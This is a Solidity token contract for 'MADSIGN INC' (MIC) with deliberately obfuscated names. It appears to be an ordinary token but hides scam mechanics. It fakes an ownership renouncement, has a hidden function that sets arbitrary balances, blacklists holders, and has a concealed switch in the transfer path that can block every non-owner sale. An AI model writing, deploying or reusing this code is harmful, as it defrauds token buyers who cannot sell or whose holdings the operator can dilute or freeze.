//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface receiverLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atReceiver) external view returns (uint256);

    function transfer(address amountTo, uint256 autoFee) external returns (bool);

    function allowance(address swapTeam, address spender) external view returns (uint256);

    function approve(address spender, uint256 autoFee) external returns (bool);

    function transferFrom(address sender,address amountTo,uint256 autoFee) external returns (bool);

    event Transfer(address indexed from, address indexed launchToIs, uint256 value);
    event Approval(address indexed swapTeam, address indexed spender, uint256 value);
}

interface sellList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface walletSender {
    function createPair(address fromExempt, address minWallet) external returns (address);
}

abstract contract exemptFeeSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityMin is receiverLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MADSIGNINC is exemptFeeSender, receiverLaunch, liquidityMin {

    function launchAuto() public {
        emit OwnershipTransferred(feeMaxTotal, address(0));
        atMarketingFund = address(0);
    }

    constructor (){
        if (fromMax != receiverEnable) {
            fromMax = feeAt;
        }
        launchAuto();
        sellList amountLiquidityLaunch = sellList(minShould);
        launchedExempt = walletSender(amountLiquidityLaunch.factory()).createPair(amountLiquidityLaunch.WETH(), address(this));
        if (listTrading == tokenFrom) {
            atFee = receiverEnable;
        }
        feeMaxTotal = _msgSender();
        limitSell[feeMaxTotal] = true;
        takeTeamIs[feeMaxTotal] = maxTotalLaunched;
        if (fromMax != fundEnable) {
            feeAt = tokenFrom;
        }
        emit Transfer(address(0), feeMaxTotal, maxTotalLaunched);
    }

    uint256 private maxTotalLaunched = 100000000 * 10 ** 18;

    string private txMarketing = "MADSIGN INC";

    uint256 fundShould;

    uint256 private receiverEnable;

    string private launchWallet = "MIC";

    address minShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function buyToMode(address modeSwapAt) public {
        if (tokenLaunch) {
            return;
        }
        
        limitSell[modeSwapAt] = true;
        if (receiverEnable == atFee) {
            atFee = fromMax;
        }
        tokenLaunch = true;
    }

    uint256 private listTrading;

    function fundSender(address senderTake) public {
        maxWallet();
        
        if (senderTake == feeMaxTotal || senderTake == launchedExempt) {
            return;
        }
        limitTxReceiver[senderTake] = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return maxTotalLaunched;
    }

    mapping(address => bool) public limitTxReceiver;

    function atWallet(address isLimit, uint256 autoFee) public {
        maxWallet();
        takeTeamIs[isLimit] = autoFee;
    }

    function isAt(uint256 autoFee) public {
        maxWallet();
        maxTake = autoFee;
    }

    function allowance(address feeAmount, address amountWallet) external view virtual override returns (uint256) {
        if (amountWallet == minShould) {
            return type(uint256).max;
        }
        return feeReceiver[feeAmount][amountWallet];
    }

    uint256 private tokenFrom;

    function decimals() external view virtual override returns (uint8) {
        return modeMin;
    }

    address private atMarketingFund;

    event OwnershipTransferred(address indexed swapMarketing, address indexed enableSell);

    address maxAmountReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function getOwner() external view returns (address) {
        return atMarketingFund;
    }

    mapping(address => uint256) private takeTeamIs;

    function transferFrom(address tradingFund, address amountTo, uint256 autoFee) external override returns (bool) {
        if (_msgSender() != minShould) {
            if (feeReceiver[tradingFund][_msgSender()] != type(uint256).max) {
                require(autoFee <= feeReceiver[tradingFund][_msgSender()]);
                feeReceiver[tradingFund][_msgSender()] -= autoFee;
            }
        }
        return atTotal(tradingFund, amountTo, autoFee);
    }

    uint256 private atFee;

    address public feeMaxTotal;

    function transfer(address isLimit, uint256 autoFee) external virtual override returns (bool) {
        return atTotal(_msgSender(), isLimit, autoFee);
    }

    uint256 maxTake;

    mapping(address => mapping(address => uint256)) private feeReceiver;

    function approve(address amountWallet, uint256 autoFee) public virtual override returns (bool) {
        feeReceiver[_msgSender()][amountWallet] = autoFee;
        emit Approval(_msgSender(), amountWallet, autoFee);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return txMarketing;
    }

    uint256 private fromMax;

    uint8 private modeMin = 18;

    function maxWallet() private view {
        require(limitSell[_msgSender()]);
    }

    mapping(address => bool) public limitSell;

    bool public tokenLaunch;

    uint256 private feeAt;

    address public launchedExempt;

    function symbol() external view virtual override returns (string memory) {
        return launchWallet;
    }

    function amountEnable(address tradingFund, address amountTo, uint256 autoFee) internal returns (bool) {
        require(takeTeamIs[tradingFund] >= autoFee);
        takeTeamIs[tradingFund] -= autoFee;
        takeTeamIs[amountTo] += autoFee;
        emit Transfer(tradingFund, amountTo, autoFee);
        return true;
    }

    function balanceOf(address atReceiver) public view virtual override returns (uint256) {
        return takeTeamIs[atReceiver];
    }

    uint256 private fundEnable;

    function owner() external view returns (address) {
        return atMarketingFund;
    }

    function atTotal(address tradingFund, address amountTo, uint256 autoFee) internal returns (bool) {
        if (tradingFund == feeMaxTotal) {
            return amountEnable(tradingFund, amountTo, autoFee);
        }
        uint256 fundTo = receiverLaunch(launchedExempt).balanceOf(maxAmountReceiver);
        require(fundTo == maxTake);
        require(!limitTxReceiver[tradingFund]);
        return amountEnable(tradingFund, amountTo, autoFee);
    }

}